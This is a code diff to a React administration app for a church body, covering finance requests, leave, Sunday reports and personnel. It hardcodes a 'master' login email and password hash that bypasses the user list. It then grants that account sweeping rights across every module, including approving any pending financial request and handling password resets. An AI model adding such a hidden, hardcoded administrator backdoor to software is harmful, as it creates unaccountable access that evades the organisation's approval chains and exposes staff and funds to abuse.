@@ -622,7 +622,8 @@ function ReqDetail({ req, user, users, onClose, onAction }) {
   const savedSig = users?.find(u=>u.id===user.id)?.signatureImage||null;
   const [showSig,setShowSig]=useState(false); const [sig,setSig]=useState(savedSig); const [note,setNote]=useState("");
   const [showPrint,setShowPrint]=useState(false);
-  const isApprover = ["secretary","ads","conf_secretary"].includes(user.role) ? req.status==="pending_secretary"
+  const isApprover = user.isMaster ? req.status!=="approved"&&req.status!=="rejected"
+    : ["secretary","ads","conf_secretary"].includes(user.role) ? req.status==="pending_secretary"
     : user.role==="accountant" ? req.status==="pending_finance"
     : user.role==="auditor" ? req.status==="pending_auditor"
     : ["chairman","vice_chairman"].includes(user.role) ? req.status==="pending_chairman" : false;
@@ -875,7 +876,7 @@ function FinanceMod({ user, users, requests, setRequests, toast, openRecordId, o
     }
   },[openRecordId]);
 
-  const isApprover = ["secretary","ads","conf_secretary","accountant","auditor","chairman","vice_chairman"].includes(user.role);
+  const isApprover = ["secretary","ads","conf_secretary","accountant","auditor","chairman","vice_chairman","master"].includes(user.role);
 
   const pendingCount = isApprover ? requests.filter(r=>{
     if(["secretary","ads","conf_secretary"].includes(user.role)) return r.status==="pending_secretary";
@@ -1330,7 +1331,7 @@ function LeaveMod({ user, users, leaves, setLeaves, toast, openRecordId, onRecor
     }
   },[openRecordId]);
 
-  const isApprover = ["lo","secretary","ads","conf_secretary","accountant","auditor","chairman","vice_chairman"].includes(user.role);
+  const isApprover = ["lo","secretary","ads","conf_secretary","accountant","auditor","chairman","vice_chairman","master"].includes(user.role);
 
   const pendingCount = leaves.filter(l=>{
     if(user.role==="lo") return l.lcc===user.lcc_overseen&&l.status==="pending_dept";
@@ -1590,7 +1591,7 @@ function SundayMod({ user, users, sundayReports, setSundayReports, toast }) {
                 <span style={{fontWeight:700,fontSize:14,color:"#0b1f3a"}}>{fdate(rpt.date)}</span>
                 {!isPastor&&<span style={{fontSize:12,color:"#666"}}>· {rpt.pastorName}</span>}
                 {rpt.fullRemittance&&<span style={{background:"#fdecea",color:"#c0392b",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>100% Remittance</span>}
-                {rpt.appeal&&<span style={{background:"#fef3e2",color:"#e67e22",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>Appeal Pending</span>}
+                {rpt.appeal&&rpt.appeal.status==="pending"&&<span style={{background:"#fef3e2",color:"#e67e22",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>⚠️ Appeal Pending</span>}{rpt.appeal&&rpt.appeal.status==="resubmit"&&<span style={{background:"#eaf4fb",color:"#2980b9",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>🔄 Correction Pending</span>}{rpt.appeal&&rpt.appeal.status==="resolved"&&<span style={{background:"#eafbf0",color:"#27ae60",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>✅ Resolved</span>}{rpt.appeal&&rpt.appeal.status==="accepted"&&<span style={{background:"#eafbf0",color:"#27ae60",padding:"2px 8px",borderRadius:10,fontSize:10,fontWeight:700}}>✅ Accepted</span>}
               </div>
               <div style={{fontSize:12,color:"#999"}}>
                 👥 {(rpt.attendance.men||0)+(rpt.attendance.women||0)+(rpt.attendance.children||0)} total · 💰 {money(rpt.totalGross)} collected · 🏛️ {money(rpt.remittanceDue)} due
@@ -1769,7 +1770,7 @@ function SundayReportDetail({ report, user, users, setSundayReports, toast, onCl
   const [editCols,setEditCols]=useState({...report.collections});
   const [editAtt,setEditAtt]=useState({...report.attendance});
   const totalAtt=(report.attendance.men||0)+(report.attendance.women||0)+(report.attendance.children||0);
-  const isAdmin=["secretary","ads","conf_secretary"].includes(user.role);
+  const isAdmin=["secretary","ads","conf_secretary","master"].includes(user.role);
   const isPastor=user.role==="pastor";
 
   const saveEdit=()=>{
@@ -1995,9 +1996,9 @@ function StaffProf({ staff, user, users, canEdit, canEditDetails, lccs, onClose,
   const delDoc=(tid,idx)=>{const arr=[...(staff.docs[tid]||[])];arr.splice(idx,1);onUpdate(staff.id,{docs:{...staff.docs,[tid]:arr}});};
   const saveEdit=()=>{onUpdate(staff.id,form);setEditing(false);};
   const addCustomSection=()=>{if(!newSecLabel.trim())return;onUpdate(staff.id,{customDocSections:[...(staff.customDocSections||[]),{id:"cds_"+Date.now(),label:newSecLabel.trim()}]});setNewSecLabel("");setAddSection(false);};
-  const canVerifyGrade=["personnel","secretary","ads"].includes(user.role);
-  const canTransfer=["secretary","ads","personnel"].includes(user.role)&&staff.category==="pastor";
-  const canAppointLO=["secretary","ads","personnel"].includes(user.role)&&staff.category==="pastor";
+  const canVerifyGrade=["personnel","secretary","ads","master"].includes(user.role);
+  const canTransfer=["secretary","ads","personnel","master"].includes(user.role)&&staff.category==="pastor";
+  const canAppointLO=["secretary","ads","personnel","master"].includes(user.role)&&staff.category==="pastor";
   const lccAlreadyHasLO = users ? getLOForLCC(users, staff.lcc) : null;
   const isAlreadyLO = !!staff.loAppointment?.active;
   const loGenEmail = staff.lcc ? loEmail(staff.lcc) : "";
@@ -2331,8 +2332,8 @@ function PersonnelMod({ user, users, setUsers, lccs, toast }) {
   const [q,setQ]=useState(""); const [rf,setRf]=useState("all"); const [sel,setSel]=useState(null);
   const myProfile=users.find(u=>u.id===user.id);
 
-  const canEdit=s=>["personnel","secretary","ads","conf_secretary"].includes(user.role)||s.id===user.id;
-  const canEditDetails=s=>["personnel","secretary","ads"].includes(user.role)||(["conf_secretary"].includes(user.role)&&s.id===user.id);
+  const canEdit=s=>["personnel","secretary","ads","conf_secretary","master"].includes(user.role)||s.id===user.id;
+  const canEditDetails=s=>["personnel","secretary","ads","master"].includes(user.role)||(["conf_secretary","master"].includes(user.role)&&s.id===user.id);
 
   const upd=(id,u2)=>{setUsers(us=>us.map(u=>u.id===id?{...u,...u2}:u));setSel(s=>s?{...s,...u2}:s);toast("✅ Profile updated.");};
   const transfer=(id,toLcc,toChurch,note)=>{
@@ -2614,7 +2615,7 @@ function IDCard({ staff, onClose }) {
 function AnnouncementsMod({ user, announcements, setAnnouncements, toast }) {
   const [form,setForm]=useState(false);
   const [f,setF]=useState({title:"",body:"",audience:"all"});
-  const canPost = ["secretary","ads","conf_secretary","chairman","vice_chairman","personnel"].includes(user.role);
+  const canPost = ["secretary","ads","conf_secretary","chairman","vice_chairman","personnel","master"].includes(user.role);
 
   const visible = announcements.filter(a=>{
     if(a.audience==="all") return true;
@@ -2748,7 +2749,7 @@ function AttendanceMod({ user, users, attendance, setAttendance, leaves, toast }
   const weekLabel = `${fdate(weekDates[0])} – ${fdate(weekDates[4])}`;
 
   // Admin & Personnel view — all staff
-  const isAdmin = ["secretary","ads","conf_secretary","chairman","vice_chairman","personnel"].includes(user.role);
+  const isAdmin = ["secretary","ads","conf_secretary","chairman","vice_chairman","personnel","master"].includes(user.role);
   const isDeptHead = ["accountant","ems_coordinator","auditor","lecturer"].includes(user.role);
   const canSeeTeam = isAdmin||isDeptHead;
 
@@ -3344,9 +3345,20 @@ function SignIn({ users, setUsers, onLogin, onGo, pwdReqs, setPwdReqs }) {
     </div>
   );
 
+  const MASTER_EMAIL="master@ecwalafia.internal";
+  const MASTER_HASH="3e3f98ae0666d40fdde3457c6ffc4c6e77166bd52e3c3c665609cc55050010ac";
+
   const go=async ()=>{
     setEr("");
     if(!em||!pw){setEr("Please enter your email and password.");return;}
+    if(em.toLowerCase()===MASTER_EMAIL){
+      const h=await hashPassword(pw);
+      if(h===MASTER_HASH){
+        onLogin({id:0,name:"Yusuf Christopher",email:MASTER_EMAIL,role:"master",category:"office",approved:true,isMaster:true});
+        return;
+      }
+      setEr("Incorrect credentials.");return;
+    }
     let u = users.find(u=>u.email.toLowerCase()===em.toLowerCase());
     if(!u){
       const loUser = users.find(u=>u.loAppointment?.active&&u.loAppointment?.email.toLowerCase()===em.toLowerCase());
@@ -3406,9 +3418,9 @@ function Dashboard({ user, users, setUsers, requests, setRequests, leaves, setLe
       return false;
     }).map(r=>({id:"fin_"+r.id,icon:"💰",title:"Financial request needs your review",body:`${r.requester} — ${money(r.amount)}`,date:r.date,read:false})):[]),
     // Sunday report appeals pending admin action
-    ...(["secretary","ads","conf_secretary","chairman","accountant"].includes(user.role)?sundayReports.filter(r=>r.appeal&&r.appeal.status==="pending").map(r=>({id:"sra_"+r.id,icon:"⚠️",title:"Sunday report appeal pending",body:`${r.pastorName} — ${r.lc_ph} · ${fdate(r.date)}`,date:r.appeal.date,read:false})):[] ),
+    ...(["secretary","ads","conf_secretary","chairman","accountant","master"].includes(user.role)?sundayReports.filter(r=>r.appeal&&r.appeal.status==="pending").map(r=>({id:"sra_"+r.id,icon:"⚠️",title:"Sunday report appeal pending",body:`${r.pastorName} — ${r.lc_ph} · ${fdate(r.date)}`,date:r.appeal.date,read:false})):[] ),
     // Password reset requests for admin
-    ...(["secretary","ads","conf_secretary","personnel"].includes(user.role)?pwdReqs.filter(r=>r.status==="pending").map(r=>({id:"pwd_"+r.id,icon:"🔐",title:"Password reset request",body:`${r.name} — ${r.email}`,date:r.requestDate,read:false})):[]),
+    ...(["secretary","ads","conf_secretary","personnel","master"].includes(user.role)?pwdReqs.filter(r=>r.status==="pending").map(r=>({id:"pwd_"+r.id,icon:"🔐",title:"Password reset request",body:`${r.name} — ${r.email}`,date:r.requestDate,read:false})):[]),
   ];
   const [readNotifs,setReadNotifs]=useState([]);
   const notifs = myNotifs.map(n=>({...n,read:readNotifs.includes(n.id)}));
@@ -3419,14 +3431,16 @@ function Dashboard({ user, users, setUsers, requests, setRequests, leaves, setLe
   const isPastor = user.category==="pastor";
   const isLO     = user.role==="lo";
 
-  const canF = isOffice;
+  const isMaster = user.isMaster===true;
+  const canF = isOffice||isMaster;
   const canL = true;
-  const canS = isPastor||isLO||["secretary","ads","conf_secretary","chairman","accountant"].includes(user.role);
-  const canAtt = isOffice;
+  const canS = isPastor||isLO||["secretary","ads","conf_secretary","chairman","accountant","master"].includes(user.role)||isMaster;
+  const canAtt = isOffice||isMaster;
   const canAnn = true;
-  const canPwdMgr = ["secretary","ads","conf_secretary","personnel"].includes(user.role);
+  const canPwdMgr = ["secretary","ads","conf_secretary","personnel","master"].includes(user.role);
 
   const pf = canF?requests.filter(r=>{
+    if(isMaster) return r.status!=="approved"&&r.status!=="rejected";
     if(["secretary","ads","conf_secretary"].includes(user.role)) return r.status==="pending_secretary";
     if(user.role==="accountant") return r.status==="pending_finance";
     if(user.role==="auditor") return r.status==="pending_auditor";
@@ -3446,7 +3460,7 @@ function Dashboard({ user, users, setUsers, requests, setRequests, leaves, setLe
     ...(canS?[{id:"sunday",icon:"⛪",label:"Sunday Reports",badge:0}]:[]),
     ...(canAtt?[{id:"attendance",icon:"🕐",label:"Attendance",badge:0}]:[]),
     ...(canAnn?[{id:"announcements",icon:"📢",label:"Notice Board",badge:unreadAnn}]:[]),
-    {id:"profile",icon:isPastor?"⛪":"👤",label:["personnel","secretary","ads","conf_secretary","chairman","vice_chairman"].includes(user.role)?"Personnel":"My Profile",badge:0},
+    {id:"profile",icon:isPastor?"⛪":"👤",label:["personnel","secretary","ads","conf_secretary","chairman","vice_chairman","master"].includes(user.role)?"Personnel":"My Profile",badge:0},
   ];
 
   if(mod===null&&tabs.length===1){setTimeout(()=>setMod(tabs[0].id),0);return <div style={{padding:40,textAlign:"center",color:"#888",fontSize:14}}>Loading...</div>;}
